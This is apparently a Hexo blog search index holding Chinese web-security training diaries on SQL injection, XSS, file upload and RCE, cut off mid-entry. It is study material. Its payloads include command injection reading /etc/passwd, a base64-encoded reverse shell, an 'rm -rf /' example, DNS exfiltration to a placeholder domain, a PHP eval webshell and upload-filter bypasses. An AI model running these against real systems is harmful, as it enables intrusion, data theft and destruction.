<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>&#39;实训记录5&#39;</title>
      <link href="/2025/03/28/shi-xun-ji-lu-5/"/>
      <url>/2025/03/28/shi-xun-ji-lu-5/</url>
      
        <content type="html"><![CDATA[<h1 id="Web安全学习日志-第五天"><a href="#Web安全学习日志-第五天" class="headerlink" title="Web安全学习日志 - 第五天"></a>Web安全学习日志 - 第五天</h1><h3 id="今日学习目标"><a href="#今日学习目标" class="headerlink" title="今日学习目标"></a><strong>今日学习目标</strong></h3><ol><li>掌握RCE漏洞的原理与分类</li><li>理解命令执行与代码执行的区别</li><li>学习RCE攻击的Payload构造与利用</li><li>熟悉反弹Shell的实现方法</li><li>了解RCE漏洞的防御策略</li></ol><h3 id="一、RCE漏洞核心概念"><a href="#一、RCE漏洞核心概念" class="headerlink" title="一、RCE漏洞核心概念"></a><strong>一、RCE漏洞核心概念</strong></h3><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a><strong>1. 定义</strong></h4><ul><li><strong>远程命令执行（RCE）</strong>：攻击者通过网络远程执行目标服务器的系统命令。</li><li><strong>远程代码执行（RCE）</strong>：攻击者远程执行目标服务器的任意代码（如PHP、Python）。</li></ul><h4 id="2-核心危害"><a href="#2-核心危害" class="headerlink" title="2. 核心危害"></a><strong>2. 核心危害</strong></h4><ul><li><strong>权限控制</strong>：获取服务器管理员权限（Root&#x2F;Administrator）。</li><li><strong>数据窃取</strong>：读取敏感文件（如数据库配置、用户密码）。</li><li><strong>横向渗透</strong>：以内网服务器为跳板进一步攻击。</li></ul><h3 id="二、RCE漏洞原理与分类"><a href="#二、RCE漏洞原理与分类" class="headerlink" title="二、RCE漏洞原理与分类"></a><strong>二、RCE漏洞原理与分类</strong></h3><h4 id="1-漏洞成因"><a href="#1-漏洞成因" class="headerlink" title="1. 漏洞成因"></a><strong>1. 漏洞成因</strong></h4><ul><li><strong>未过滤的用户输入</strong>：参数直接拼接到系统命令或代码执行函数中。</li><li><strong>危险函数调用</strong>：使用<code>system()</code>、<code>exec()</code>、<code>eval()</code>等函数时未做安全校验。</li></ul><h4 id="2-漏洞分类"><a href="#2-漏洞分类" class="headerlink" title="2. 漏洞分类"></a><strong>2. 漏洞分类</strong></h4><table><thead><tr><th>类型</th><th>触发条件</th><th>示例语言</th></tr></thead><tbody><tr><td><strong>命令执行</strong></td><td>用户输入拼接到<code>system()</code>、<code>shell_exec()</code>等系统命令函数</td><td>PHP、Python</td></tr><tr><td><strong>代码执行</strong></td><td>用户输入拼接到<code>eval()</code>、<code>compile()</code>等代码执行函数</td><td>PHP、Java</td></tr></tbody></table><h4 id="3-操作系统差异"><a href="#3-操作系统差异" class="headerlink" title="3. 操作系统差异"></a><strong>3. 操作系统差异</strong></h4><table><thead><tr><th>系统</th><th>命令分隔符</th><th>目录列表命令</th><th>路径符号</th></tr></thead><tbody><tr><td>Linux</td><td><code>;</code>&#x2F;<code>&amp;</code></td><td><code>ls</code></td><td><code>/</code></td></tr><tr><td>Windows</td><td><code>&amp;</code>&#x2F;<code>&amp;&amp;</code></td><td><code>dir</code></td><td><code>\</code></td></tr></tbody></table><h3 id="三、RCE攻击Payload构造"><a href="#三、RCE攻击Payload构造" class="headerlink" title="三、RCE攻击Payload构造"></a><strong>三、RCE攻击Payload构造</strong></h3><h4 id="1-基础Payload示例"><a href="#1-基础Payload示例" class="headerlink" title="1. 基础Payload示例"></a><strong>1. 基础Payload示例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">127.0.0.1; <span class="built_in">ls</span> /etc</span><br><span class="line">127.0.0.1 &amp; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">127.0.0.1&amp;<span class="built_in">dir</span> c:\</span><br><span class="line">127.0.0.1&amp;&amp;<span class="built_in">type</span> c:\boot.ini</span><br></pre></td></tr></table></figure><h4 id="2-高级绕过技巧"><a href="#2-高级绕过技巧" class="headerlink" title="2. 高级绕过技巧"></a><strong>2. 高级绕过技巧</strong></h4><table><thead><tr><th>方法</th><th>示例 Payload</th><th>说明</th></tr></thead><tbody><tr><td><strong>编码绕过</strong></td><td>&#96;127.0.0.1; echo ‘YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx’</td><td>Base64 编码反弹 Shell 命令</td></tr><tr><td><strong>符号绕过</strong></td><td><code>127.0.0.1$&#123;IFS&#125;&amp;&amp;$&#123;IFS&#125;ls</code></td><td>使用 IFS 环境变量绕过空格</td></tr><tr><td><strong>条件竞争</strong></td><td><code>127.0.0.1; sleep 10; rm -rf /</code></td><td>延时执行破坏性命令</td></tr></tbody></table><h4 id="3-反弹-Shell"><a href="#3-反弹-Shell" class="headerlink" title="3. 反弹 Shell"></a><strong>3. 反弹 Shell</strong></h4><h3 id="四、RCE-漏洞利用场景"><a href="#四、RCE-漏洞利用场景" class="headerlink" title="四、RCE 漏洞利用场景"></a><strong>四、RCE 漏洞利用场景</strong></h3><h4 id="1-结合其他漏洞"><a href="#1-结合其他漏洞" class="headerlink" title="1. 结合其他漏洞"></a><strong>1. 结合其他漏洞</strong></h4><ul><li><strong>文件上传漏洞</strong>：上传 Webshell 后通过 RCE 执行系统命令。</li><li><strong>SSRF 漏洞</strong>：利用 RCE 触发内网服务探测（如 Redis 未授权访问）。</li></ul><h4 id="2-无回显-RCE-利用"><a href="#2-无回显-RCE-利用" class="headerlink" title="2. 无回显 RCE 利用"></a><strong>2. 无回显 RCE 利用</strong></h4><ul><li><strong>外带数据</strong>：通过 DNS 查询泄露数据（如<code>nslookup $(whoami).yourdomain.com</code>）。</li><li><strong>文件写入</strong>：将结果写入可访问的文件（如<code>echo $(id) &gt; /var/www/html/output.txt</code>）。</li></ul><h3 id="五、工具与实战"><a href="#五、工具与实战" class="headerlink" title="五、工具与实战"></a><strong>五、工具与实战</strong></h3><h4 id="1-漏洞利用工具"><a href="#1-漏洞利用工具" class="headerlink" title="1. 漏洞利用工具"></a><strong>1. 漏洞利用工具</strong></h4><ul><li><strong>Metasploit</strong>：集成多个 RCE 漏洞模块（如<code>exploit/multi/http/tomcat_jsp_upload</code>）。</li><li><strong>蚁剑</strong>：支持 RCE 漏洞生成与 Shell 管理。</li><li><strong>Burp Suite</strong>：抓包分析并构造 Payload。</li></ul><h4 id="2-靶场推荐"><a href="#2-靶场推荐" class="headerlink" title="2. 靶场推荐"></a><strong>2. 靶场推荐</strong></h4><ul><li><strong>Vulhub</strong>：RCE 漏洞专项靶场（如<code>vulhub/php/thinkphp_rce</code>）。</li><li><strong>DVWA</strong>：高难度 RCE 模块（需手动构造 Payload）。</li></ul><h3 id="六、防御策略"><a href="#六、防御策略" class="headerlink" title="六、防御策略"></a><strong>六、防御策略</strong></h3><h4 id="1-代码层防御"><a href="#1-代码层防御" class="headerlink" title="1. 代码层防御"></a><strong>1. 代码层防御</strong></h4><ul><li><strong>禁用危险函数</strong>：避免使用<code>system()</code>、<code>eval()</code>等函数。</li><li><strong>输入过滤</strong>：使用白名单校验输入内容（如仅允许数字、字母）。</li><li><strong>参数化查询</strong>：对数据库操作使用预编译语句。</li></ul><h4 id="2-系统层防御"><a href="#2-系统层防御" class="headerlink" title="2. 系统层防御"></a><strong>2. 系统层防御</strong></h4><ul><li><strong>最小权限原则</strong>：限制 Web 服务用户权限（如禁止执行<code>rm</code>命令）。</li><li><strong>安装 WAF</strong>：部署 Web 应用防火墙（如 ModSecurity）。</li><li><strong>及时更新补丁</strong>：修复已知 RCE 漏洞（如 Log4j 2.x 漏洞）。</li></ul><h3 id="七、总结与明日计划"><a href="#七、总结与明日计划" class="headerlink" title="七、总结与明日计划"></a><strong>七、总结与明日计划</strong></h3><h4 id="1-今日重点"><a href="#1-今日重点" class="headerlink" title="1. 今日重点"></a><strong>1. 今日重点</strong></h4><ul><li>RCE 漏洞的原理与分类</li><li>Payload 构造与反弹 Shell 实现</li><li>结合其他漏洞的利用方法</li></ul><h1 id="漏洞利用及RCE漏洞"><a href="#漏洞利用及RCE漏洞" class="headerlink" title="漏洞利用及RCE漏洞"></a>漏洞利用及RCE漏洞</h1><p>能够获取一些边界服务器当跳板机来进入网络环境</p><h2 id="获取边界服务器的权限"><a href="#获取边界服务器的权限" class="headerlink" title="获取边界服务器的权限"></a>获取边界服务器的权限</h2><h3 id="通过web漏洞去获取权限（入侵类-逻辑类）"><a href="#通过web漏洞去获取权限（入侵类-逻辑类）" class="headerlink" title="通过web漏洞去获取权限（入侵类 逻辑类）"></a>通过web漏洞去获取权限（入侵类 逻辑类）</h3><p>文件上传 rce sql注入 ssrf</p><p>0day 没有公开 厂商也没有打补丁的漏洞</p><p>1day 没有公开 厂商打了补丁</p><p>nday 公开 厂商打了漏洞</p><h3 id="通过钓鱼获取"><a href="#通过钓鱼获取" class="headerlink" title="通过钓鱼获取"></a>通过钓鱼获取</h3><p>近源渗透  wifi渗透 sslvpn凭证 社会工程学</p><h2 id="RCE漏洞（远程代码执行漏洞）"><a href="#RCE漏洞（远程代码执行漏洞）" class="headerlink" title="RCE漏洞（远程代码执行漏洞）"></a>RCE漏洞（远程代码执行漏洞）</h2><p>黑客可以在你的电脑上执行命令-&gt;电脑被控制</p><p>渗透测试工程师-&gt;士兵</p><p>漏洞及漏洞利用工具-&gt;武器</p><p>安全开发工程师-&gt;造武器的</p><p>安全研究员-&gt;挖漏洞的</p><p>命令执行函数：shell_exec(),拼接漏洞</p><p>漏洞原理：用户输入的参数没有进行严格的过滤，参数直接拼接到后端代码</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>&#39;实训记录4&#39;</title>
      <link href="/2025/03/27/shi-xun-ji-lu-4/"/>
      <url>/2025/03/27/shi-xun-ji-lu-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Web安全学习日志-第四天"><a href="#Web安全学习日志-第四天" class="headerlink" title="Web安全学习日志 - 第四天"></a>Web安全学习日志 - 第四天</h1><h3 id="今日学习目标"><a href="#今日学习目标" class="headerlink" title="今日学习目标"></a><strong>今日学习目标</strong></h3><ol><li>掌握文件操作漏洞的类型与危害</li><li>理解文件上传漏洞的原理与利用</li><li>熟悉Webshell的分类与管理工具</li><li>学习绕过文件上传防御的技巧</li><li>了解内网渗透的基础概念</li></ol><h3 id="一、文件操作漏洞概述"><a href="#一、文件操作漏洞概述" class="headerlink" title="一、文件操作漏洞概述"></a><strong>一、文件操作漏洞概述</strong></h3><h4 id="1-漏洞类型"><a href="#1-漏洞类型" class="headerlink" title="1. 漏洞类型"></a><strong>1. 漏洞类型</strong></h4><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td><strong>文件上传</strong></td><td>上传恶意脚本文件（如<code>.php</code>）获取服务器权限</td></tr><tr><td><strong>文件读取</strong></td><td>读取敏感文件（如<code>/etc/passwd</code>、数据库配置）</td></tr><tr><td><strong>文件下载</strong></td><td>未授权下载敏感文件（如备份文件、日志文件）</td></tr><tr><td><strong>文件包含</strong></td><td>通过<code>include</code>&#x2F;<code>require</code>包含远程文件执行代码（如LFI&#x2F;RFI）</td></tr></tbody></table><h4 id="2-攻击对象"><a href="#2-攻击对象" class="headerlink" title="2. 攻击对象"></a><strong>2. 攻击对象</strong></h4><ul><li><strong>脚本文件</strong>：<code>.php</code>、<code>.jsp</code>、<code>.asp</code>（可执行恶意代码）</li><li><strong>配置文件</strong>：<code>config.php</code>、<code>web.xml</code>（泄露数据库连接信息）</li><li><strong>敏感文件</strong>：<code>robots.txt</code>、<code>.git</code>目录（暴露网站结构）</li></ul><h3 id="二、文件上传漏洞深度解析"><a href="#二、文件上传漏洞深度解析" class="headerlink" title="二、文件上传漏洞深度解析"></a><strong>二、文件上传漏洞深度解析</strong></h3><h4 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a><strong>1. 漏洞原理</strong></h4><ul><li><strong>核心条件</strong>：服务器未对用户上传的文件类型、内容进行严格校验。</li><li><strong>攻击目标</strong>：上传Webshell（网页木马）控制服务器。</li></ul><h4 id="2-Webshell分类"><a href="#2-Webshell分类" class="headerlink" title="2. Webshell分类"></a><strong>2. Webshell分类</strong></h4><table><thead><tr><th>类型</th><th>特点描述</th></tr></thead><tbody><tr><td><strong>小马</strong></td><td>一句话木马（如<code>&lt;?php @eval($_POST[1]);?&gt;</code>），需配合管理工具使用</td></tr><tr><td><strong>大马</strong></td><td>功能齐全（文件管理、命令执行），体积较大</td></tr><tr><td><strong>内存马</strong></td><td>无文件落地，驻留在内存中（隐蔽性强，查杀难度高）</td></tr></tbody></table><h4 id="3-管理工具"><a href="#3-管理工具" class="headerlink" title="3. 管理工具"></a><strong>3. 管理工具</strong></h4><ul><li><strong>中国菜刀</strong>：经典Webshell管理工具，支持批量管理</li><li><strong>蚁剑</strong>：国产工具，支持多种协议（HTTP&#x2F;HTTPS）</li><li><strong>哥斯拉&#x2F;冰蝎</strong>：基于加密通信的Webshell（绕过WAF检测）</li></ul><h3 id="三、绕过文件上传防御的技巧"><a href="#三、绕过文件上传防御的技巧" class="headerlink" title="三、绕过文件上传防御的技巧"></a><strong>三、绕过文件上传防御的技巧</strong></h3><h4 id="1-客户端校验绕过"><a href="#1-客户端校验绕过" class="headerlink" title="1. 客户端校验绕过"></a><strong>1. 客户端校验绕过</strong></h4><ul><li><strong>方法</strong>：禁用浏览器JavaScript或通过Burp修改请求包。</li></ul><h4 id="2-服务器端校验绕过"><a href="#2-服务器端校验绕过" class="headerlink" title="2. 服务器端校验绕过"></a><strong>2. 服务器端校验绕过</strong></h4><table><thead><tr><th>防御策略</th><th>绕过方法</th></tr></thead><tbody><tr><td><strong>黑名单</strong></td><td>大小写混淆（<code>PhP</code>）、双后缀（<code>test.php.jpg</code>）、特殊符号（<code>test.php::$DATA</code>）</td></tr><tr><td><strong>白名单</strong></td><td>修改文件头（如在<code>.php</code>文件前添加<code>GIF89a</code>）</td></tr><tr><td><strong>文件内容检测</strong></td><td>对Webshell代码进行编码（Base64、Unicode）</td></tr></tbody></table><h4 id="3-图片马制作"><a href="#3-图片马制作" class="headerlink" title="3. 图片马制作"></a><strong>3. 图片马制作</strong></h4><ol><li><strong>记事本拼接法</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">   copy /b image.jpg + shell.php new.jpg</span><br><span class="line"></span><br><span class="line">1. 在线生成工具</span><br><span class="line">   - 使用`img2payload`等工具将恶意代码嵌入图片。</span><br><span class="line"></span><br><span class="line"><span class="comment">### **四、内网渗透基础**</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### **1. 边界服务器利用**</span></span><br><span class="line"></span><br><span class="line">- 获取权限</span><br><span class="line"></span><br><span class="line">  ：</span><br><span class="line"></span><br><span class="line">  - 通过 Web 漏洞（如文件上传、RCE）</span><br><span class="line">  - 社会工程学（钓鱼获取 VPN 凭证）</span><br><span class="line"></span><br><span class="line">- **跳板机**：利用边界服务器作为进入内网的跳板。</span><br><span class="line"></span><br><span class="line"><span class="comment">#### **2. 横向渗透目标**</span></span><br><span class="line"></span><br><span class="line">- **文件服务器**：窃取敏感文档（如`*.docx`、`*.pdf`）</span><br><span class="line">- **邮件服务器**：获取用户邮箱凭证</span><br><span class="line">- **域控服务器**：控制整个域环境（需高权限）</span><br><span class="line"></span><br><span class="line"><span class="comment">#### **3. 渗透路径**</span></span><br><span class="line"></span><br><span class="line">```plaintext</span><br><span class="line">互联网 → 边界服务器 → 内网服务器 → 核心系统</span><br></pre></td></tr></table></figure></li></ol><h3 id="五、工具与实战"><a href="#五、工具与实战" class="headerlink" title="五、工具与实战"></a><strong>五、工具与实战</strong></h3><h4 id="1-漏洞利用工具"><a href="#1-漏洞利用工具" class="headerlink" title="1. 漏洞利用工具"></a><strong>1. 漏洞利用工具</strong></h4><ul><li><strong>Webshell 管理</strong>：中国菜刀、蚁剑、冰蝎</li><li><strong>文件检测</strong>：<code>exiftool</code>查看文件头信息</li><li><strong>内网扫描</strong>：Nmap、Metasploit</li></ul><h4 id="2-靶场推荐"><a href="#2-靶场推荐" class="headerlink" title="2. 靶场推荐"></a><strong>2. 靶场推荐</strong></h4><ul><li><strong>Upload-Labs</strong>：专业文件上传漏洞靶场</li><li><strong>VulnHub</strong>：包含内网渗透场景的虚拟机镜像</li></ul><h3 id="六、总结与明日计划"><a href="#六、总结与明日计划" class="headerlink" title="六、总结与明日计划"></a><strong>六、总结与明日计划</strong></h3><h4 id="1-今日重点"><a href="#1-今日重点" class="headerlink" title="1. 今日重点"></a><strong>1. 今日重点</strong></h4><ul><li>文件上传漏洞的利用流程与防御绕过</li><li>Webshell 的分类与管理工具</li><li>内网渗透的基础概念与路径</li></ul><p><strong>问题记录</strong>：需进一步理解内存马的工作原理与查杀方法<br><strong>参考资料</strong>：《Web 安全深度剖析》第 5 章（文件上传漏洞）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>&#39;实训记录3&#39;</title>
      <link href="/2025/03/26/shi-xun-ji-lu-3/"/>
      <url>/2025/03/26/shi-xun-ji-lu-3/</url>
      
        <content type="html"><![CDATA[<h1 id="Web安全学习日志-第三天"><a href="#Web安全学习日志-第三天" class="headerlink" title="Web安全学习日志 - 第三天"></a>Web安全学习日志 - 第三天</h1><h3 id="今日学习目标"><a href="#今日学习目标" class="headerlink" title="今日学习目标"></a><strong>今日学习目标</strong></h3><ol><li>掌握XSS漏洞的原理与分类</li><li>熟悉Burp Suite工具的基础操作</li><li>理解HTTP&#x2F;HTTPS协议的安全差异</li><li>学习XSS攻击的Payload构造与利用</li></ol><h3 id="一、XSS漏洞深度解析"><a href="#一、XSS漏洞深度解析" class="headerlink" title="一、XSS漏洞深度解析"></a><strong>一、XSS漏洞深度解析</strong></h3><h4 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a><strong>1. 漏洞原理</strong></h4><ul><li><strong>定义</strong>：跨站脚本攻击（Cross-Site Scripting），攻击者注入恶意JavaScript代码，突破同源策略。</li><li><strong>核心条件</strong>：<ol><li>用户输入的数据未被过滤直接输出到页面</li><li>浏览器执行了恶意脚本（如<code>&lt;script&gt;</code>标签）</li></ol></li></ul><h4 id="2-漏洞分类"><a href="#2-漏洞分类" class="headerlink" title="2. 漏洞分类"></a><strong>2. 漏洞分类</strong></h4><table><thead><tr><th>类型</th><th>触发条件</th><th>危害程度</th></tr></thead><tbody><tr><td><strong>反射型</strong></td><td>用户输入的数据在响应中直接输出（如搜索框结果）</td><td>★★★☆</td></tr><tr><td><strong>存储型</strong></td><td>用户输入的数据存储在数据库，后续被其他用户访问（如论坛评论）</td><td>★★★★★</td></tr><tr><td><strong>DOM型</strong></td><td>JavaScript通过DOM操作动态生成内容（如<code>innerHTML</code>）</td><td>★★★☆</td></tr></tbody></table><h4 id="3-攻击Payload示例"><a href="#3-攻击Payload示例" class="headerlink" title="3. 攻击Payload示例"></a><strong>3. 攻击Payload示例</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="二、Burp-Suite-基础操作"><a href="#二、Burp-Suite-基础操作" class="headerlink" title="二、Burp Suite 基础操作"></a><strong>二、Burp Suite 基础操作</strong></h3><h4 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1. 工具介绍"></a><strong>1. 工具介绍</strong></h4><ul><li><strong>功能</strong>：抓包、改包、漏洞扫描、暴力破解</li><li><strong>版本</strong>：社区版（免费）、专业版（付费）</li><li><strong>依赖</strong>：Java 环境，需配置 JRE 路径</li></ul><h4 id="2-核心模块"><a href="#2-核心模块" class="headerlink" title="2. 核心模块"></a><strong>2. 核心模块</strong></h4><table><thead><tr><th>模块</th><th>用途</th></tr></thead><tbody><tr><td><strong>Proxy</strong></td><td>拦截 HTTP&#x2F;HTTPS 请求，修改数据包</td></tr><tr><td><strong>Scanner</strong></td><td>自动化漏洞检测（如 XSS、SQL 注入）</td></tr><tr><td><strong>Repeater</strong></td><td>手动重发请求，调试 Payload</td></tr><tr><td><strong>Intruder</strong></td><td>暴力破解（如密码枚举、参数爆破）</td></tr></tbody></table><h4 id="3-HTTPS-配置"><a href="#3-HTTPS-配置" class="headerlink" title="3. HTTPS 配置"></a><strong>3. HTTPS 配置</strong></h4><ol><li><p><strong>生成证书</strong>：Burp 自带 CA 证书（<code>http://burp</code>下载）</p></li><li><p>浏览器导入</p><p>：</p><ul><li>Chrome：设置 → 隐私与安全 → 安全 → 管理证书 → 导入</li><li>Firefox：选项 → 隐私与安全 → 证书 → 查看证书 → 导入</li></ul></li></ol><h3 id="三、HTTP-与-HTTPS-协议对比"><a href="#三、HTTP-与-HTTPS-协议对比" class="headerlink" title="三、HTTP 与 HTTPS 协议对比"></a><strong>三、HTTP 与 HTTPS 协议对比</strong></h3><h4 id="1-核心区别"><a href="#1-核心区别" class="headerlink" title="1. 核心区别"></a><strong>1. 核心区别</strong></h4><table><thead><tr><th>协议</th><th>安全性</th><th>端口</th><th>加密方式</th><th>证书要求</th></tr></thead><tbody><tr><td>HTTP</td><td>不安全</td><td>80</td><td>明文传输</td><td>无</td></tr><tr><td>HTTPS</td><td>安全</td><td>443</td><td>SSL&#x2F;TLS</td><td>需要 CA 证书或自签名证书</td></tr></tbody></table><h4 id="2-证书作用"><a href="#2-证书作用" class="headerlink" title="2. 证书作用"></a><strong>2. 证书作用</strong></h4><ul><li><strong>数据加密</strong>：防止中间人窃听</li><li><strong>身份验证</strong>：验证服务器真实性</li><li><strong>完整性校验</strong>：确保数据未被篡改</li></ul><h3 id="四、XSS-漏洞利用实战"><a href="#四、XSS-漏洞利用实战" class="headerlink" title="四、XSS 漏洞利用实战"></a><strong>四、XSS 漏洞利用实战</strong></h3><h4 id="1-反射型-XSS-测试"><a href="#1-反射型-XSS-测试" class="headerlink" title="1. 反射型 XSS 测试"></a><strong>1. 反射型 XSS 测试</strong></h4><ol><li><strong>抓包</strong>：在 Burp Proxy 中拦截请求</li><li><strong>插入 Payload</strong>：修改参数值为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li><li><strong>发送请求</strong>：观察页面是否弹出警示框</li></ol><h4 id="2-DOM-型-XSS-利用"><a href="#2-DOM-型-XSS-利用" class="headerlink" title="2. DOM 型 XSS 利用"></a><strong>2. DOM 型 XSS 利用</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞代码示例（未过滤user参数）</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;output&quot;</span>).<span class="property">innerHTML</span> = <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">split</span>(<span class="string">&#x27;user=&#x27;</span>)[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p><strong>Payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/page.html?user=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="五、总结与明日计划"><a href="#五、总结与明日计划" class="headerlink" title="五、总结与明日计划"></a><strong>五、总结与明日计划</strong></h3><h4 id="1-今日重点"><a href="#1-今日重点" class="headerlink" title="1. 今日重点"></a><strong>1. 今日重点</strong></h4><ul><li>XSS 漏洞的三种类型与利用场景</li><li>Burp Suite 的基础配置与抓包改包</li><li>HTTP&#x2F;HTTPS 协议的安全差异</li></ul><h1 id="web搭建"><a href="#web搭建" class="headerlink" title="web搭建"></a>web搭建</h1><p>安装小皮面板及phpcms</p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326151344245.png" alt="image-20250326151344201"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326150756199.png" alt="image-20250326150755978"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326150819832.png" alt="image-20250326150819415"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326151308587.png" alt="image-20250326151308512"></p><p><img src="https://cdn.jsdelivr.net/gh/zoyager/blogimage@main/img/20250326151255854.png" alt="image-20250326151255778"></p><p>burpsuite抓登录管理员包</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>&#39;实训记录2&#39;</title>
      <link href="/2025/03/25/shi-xun-ji-lu-2/"/>
      <url>/2025/03/25/shi-xun-ji-lu-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Web安全学习日志-第二天"><a href="#Web安全学习日志-第二天" class="headerlink" title="Web安全学习日志 - 第二天"></a>Web安全学习日志 - 第二天</h1><h3 id="今日学习目标"><a href="#今日学习目标" class="headerlink" title="今日学习目标"></a><strong>今日学习目标</strong></h3><ol><li>掌握Web网站的核心组成部分</li><li>理解SQL注入漏洞的原理与分类</li><li>掌握SQL注入漏洞的探测与利用方法</li><li>熟悉MySQL数据库的基础操作</li></ol><h3 id="一、Web网站的构成"><a href="#一、Web网站的构成" class="headerlink" title="一、Web网站的构成"></a><strong>一、Web网站的构成</strong></h3><h4 id="1-基础架构"><a href="#1-基础架构" class="headerlink" title="1. 基础架构"></a><strong>1. 基础架构</strong></h4><p>服务器 → 源码 → Web 容器 → 数据库</p><h4 id="2-核心组件"><a href="#2-核心组件" class="headerlink" title="2. 核心组件"></a><strong>2. 核心组件</strong></h4><table><thead><tr><th>组件</th><th>说明</th></tr></thead><tbody><tr><td><strong>服务器</strong></td><td>Windows Server&#x2F;Linux服务器，承载网站运行环境</td></tr><tr><td><strong>源码</strong></td><td>- 前端：Vue&#x2F;React&#x2F;Webpack<br>- 后端：Spring&#x2F;PHP&#x2F;Node.js</td></tr><tr><td><strong>数据库</strong></td><td>MySQL&#x2F;PostgreSQL&#x2F;Redis，存储业务数据</td></tr><tr><td><strong>Web容器</strong></td><td>Apache&#x2F;Nginx&#x2F;Tomcat，处理HTTP请求与动态资源</td></tr></tbody></table><h4 id="3-开源代码来源"><a href="#3-开源代码来源" class="headerlink" title="3. 开源代码来源"></a><strong>3. 开源代码来源</strong></h4><ul><li><strong>GitHub</strong>：全球最大开源社区（如WordPress博客系统）</li><li><strong>CMS平台</strong>：PHPCMS（门户）、SeaCMS（影视）、Hexo（静态博客）</li></ul><h3 id="二、MySQL基础操作"><a href="#二、MySQL基础操作" class="headerlink" title="二、MySQL基础操作"></a><strong>二、MySQL基础操作</strong></h3><h4 id="1-数据库结构"><a href="#1-数据库结构" class="headerlink" title="1. 数据库结构"></a><strong>1. 数据库结构</strong></h4><p>库（Database） → 表（Table） → 字段（Column） → 数据（Data）</p><h4 id="2-SQL语句基础"><a href="#2-SQL语句基础" class="headerlink" title="2. SQL语句基础"></a><strong>2. SQL语句基础</strong></h4><table><thead><tr><th>操作类型</th><th>示例语句</th><th>说明</th></tr></thead><tbody><tr><td><strong>查询</strong></td><td><code>SELECT * FROM users WHERE id=1;</code></td><td>查询users表中id为1的数据</td></tr><tr><td><strong>插入</strong></td><td><code>INSERT INTO users (name) VALUES (&#39;admin&#39;);</code></td><td>插入新数据</td></tr><tr><td><strong>删除</strong></td><td><code>DELETE FROM users WHERE id=1;</code></td><td>删除指定数据</td></tr><tr><td><strong>更新</strong></td><td><code>UPDATE users SET name=&#39;root&#39; WHERE id=1;</code></td><td>更新数据</td></tr></tbody></table><h4 id="3-连接MySQL"><a href="#3-连接MySQL" class="headerlink" title="3. 连接MySQL"></a><strong>3. 连接MySQL</strong></h4><ul><li><strong>命令行</strong>：<code>mysql -u root -p</code>（输入密码）</li><li><strong>可视化工具</strong>：Navicat、SQLyog、phpMyAdmin</li><li><strong>集成环境</strong>：phpStudy、宝塔面板、XAMPP</li></ul><h3 id="三、SQL注入漏洞"><a href="#三、SQL注入漏洞" class="headerlink" title="三、SQL注入漏洞"></a><strong>三、SQL注入漏洞</strong></h3><h4 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a><strong>1. 